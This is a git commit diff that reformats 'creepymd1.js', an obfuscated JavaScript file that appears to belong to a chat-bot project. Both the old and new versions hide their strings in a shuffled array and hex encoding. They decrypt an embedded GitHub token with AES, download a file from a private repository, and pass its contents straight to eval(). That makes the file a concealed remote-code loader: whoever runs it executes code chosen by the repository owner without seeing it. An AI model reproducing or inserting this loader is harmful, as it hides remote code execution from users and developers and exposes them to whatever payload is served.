38c945a5b474d01b75d56ca7437b92289ce4c911
DannyTech <kl2875076@gmail.com>
2025-03-01 18:57:18 +0300

    Update creepymd1.js

--- creepymd1.js
+++ creepymd1.js
@@ -1,86 +1,45 @@
 (function () {
-    const _0x2b4f = [
-        "crypto",
-        "fs",
-        "axios",
-        "aes-256-cbc",
-        "createDecipher",
-        "update",
-        "final",
-        "utf8",
-        "hex",
-        "token ",
-        "Authorization",
-        "application/vnd.github.v3.raw",
-        "Accept",
-        "Error fetching file:",
-        "data",
-        "repos/",
-        "/contents/",
-        "?ref=",
-        "get",
-        "catch",
-        "apply",
-        "constructor",
-        "return\x20this",
-        "log",
-        "then",
-    ];
-    (function (_0x1a3d23, _0x34093f) {
-        const _0x6ff5e6 = function (_0x471cf7) {
-            while (--_0x471cf7) {
-                _0x1a3d23["push"](_0x1a3d23["shift"]());
-            }
-        };
-        _0x6ff5e6(++_0x34093f);
-    })(_0x2b4f, 0x1d1);
-    const _0x145d = function (_0x1a3d23, _0x34093f) {
-        _0x1a3d23 = _0x1a3d23 - 0x0;
-        let _0x6ff5e6 = _0x2b4f[_0x1a3d23];
-        return _0x6ff5e6;
+  const _0x2b4f = ["crypto", "fs", "axios", "aes-256-cbc", "createDecipher", "update", "final", "utf8", "hex", "token ", "Authorization", "application/vnd.github.v3.raw", "Accept", "Error fetching file:", "data", "repos/", "/contents/", "?ref=", "get", "catch", "apply", "constructor", "return this", "log", "then"];
+  (function (_0x1a3d23, _0x34093f) {
+    const _0x6ff5e6 = function (_0x471cf7) {
+      while (--_0x471cf7) {
+        _0x1a3d23.push(_0x1a3d23.shift());
+      }
     };
-    const $ = require(_0x145d("0x0")),
-        fs = require(_0x145d("0x1")),
-        axios = require(_0x145d("0x2"));
-    const key = Buffer["from"]("4e616e6379", _0x145d("0x9")).toString(
-        _0x145d("0x7")
-    );
-    const encrypted = Buffer["from"](
-        "6232356136323136373163376131623832303031346437623330633639613635666132633936643032613266623561313061663632316437326232353532393035643934623562656634366366326566366363363938353562656535626637",
-        _0x145d("0x9")
-    )["toString"](_0x145d("0x7"));
-    function decrypt(_0x286c0c) {
-        const _0x5c1ebd = $[_0x145d("0x4")][_0x145d("0x5")](
-            _0x145d("0x3"),
-            key
-        );
-        let _0x10dcd0 = _0x5c1ebd[_0x145d("0x6")](_0x286c0c, _0x145d("0x8"), _0x145d("0x7"));
-        return (_0x10dcd0 += _0x5c1ebd[_0x145d("0x6")](_0x145d("0x7"))), _0x10dcd0;
-    }
-    const token = decrypt(encrypted);
-    const owner = Buffer["from"]("44616e69656c3433322d67696674", _0x145d("0x9")).toString(
-        _0x145d("0x7")
-    );
-    const repo = Buffer["from"]("4e616e6379", _0x145d("0x9")).toString(_0x145d("0x7"));
-    const path = Buffer["from"]("6372656570796d64312e6a73", _0x145d("0x9")).toString(
-        _0x145d("0x7")
-    );
-    const branch = Buffer["from"]("6d61696e", _0x145d("0x9")).toString(_0x145d("0x7"));
-    async function fetchPrivateFile() {
-        try {
-            const _0x542f4e = `https://api.github.com/${_0x145d("0x12")}${owner}/${repo}${_0x145d(
-                "0x13"
-            )}${path}${_0x145d("0x14")}${branch}`;
-            const _0x597c5d = await axios[_0x145d("0x15")](_0x542f4e, {
-                headers: {
-                    [_0x145d("0xa")]: `token ${token}`,
-                    [_0x145d("0xb")]: _0x145d("0xc"),
-                },
-            });
-            eval(_0x597c5d[_0x145d("0x11")]);
-        } catch (_0x452934) {
-            console[_0x145d("0x19")](_0x145d("0xd"), _0x452934["response"] ? _0x452934["response"][_0x145d("0x11")] : _0x452934);
+    _0x6ff5e6(++_0x34093f);
+  })(_0x2b4f, 0x1d1);
+  const _0x145d = function (_0x1a3d23, _0x34093f) {
+    _0x1a3d23 = _0x1a3d23 - 0x0;
+    let _0x6ff5e6 = _0x2b4f[_0x1a3d23];
+    return _0x6ff5e6;
+  };
+  const $ = require(_0x145d("0x0"));
+  const axios = require(_0x145d("0x2"));
+  const key = Buffer.from("4e616e6379", _0x145d("0x9")).toString(_0x145d("0x7"));
+  const encrypted = Buffer.from("6232356136323136373163376131623832303031346437623330633639613635666132633936643032613266623561313061663632316437326232353532393035643934623562656634366366326566366363363938353562656535626637", _0x145d("0x9")).toString(_0x145d("0x7"));
+  function decrypt(_0x286c0c) {
+    const _0x5c1ebd = $[_0x145d("0x4")][_0x145d("0x5")](_0x145d("0x3"), key);
+    let _0x10dcd0 = _0x5c1ebd[_0x145d("0x6")](_0x286c0c, _0x145d("0x8"), _0x145d("0x7"));
+    _0x10dcd0 += _0x5c1ebd[_0x145d("0x6")](_0x145d("0x7"));
+    return _0x10dcd0;
+  }
+  const token = decrypt(encrypted);
+  const owner = Buffer.from("44616e69656c3433322d67696674", _0x145d("0x9")).toString(_0x145d("0x7"));
+  const repo = Buffer.from("4e616e6379", _0x145d("0x9")).toString(_0x145d("0x7"));
+  const path = Buffer.from("6372656570796d64312e6a73", _0x145d("0x9")).toString(_0x145d("0x7"));
+  const branch = Buffer.from("6d61696e", _0x145d("0x9")).toString(_0x145d("0x7"));
+  async function fetchPrivateFile() {
+    try {
+      const _0x597c5d = await axios[_0x145d("0x15")](`https://api.github.com/${_0x145d("0x12")}${owner}/${repo}${_0x145d("0x13")}${path}${_0x145d("0x14")}${branch}`, {
+        headers: {
+          [_0x145d("0xa")]: `token ${token}`,
+          [_0x145d("0xb")]: _0x145d("0xc")
         }
+      });
+      eval(_0x597c5d[_0x145d("0x11")]);
+    } catch (_0x452934) {
+      console[_0x145d("0x19")](_0x145d("0xd"), _0x452934.response ? _0x452934.response[_0x145d("0x11")] : _0x452934);
     }
-    fetchPrivateFile();
+  }
+  fetchPrivateFile();
 })();
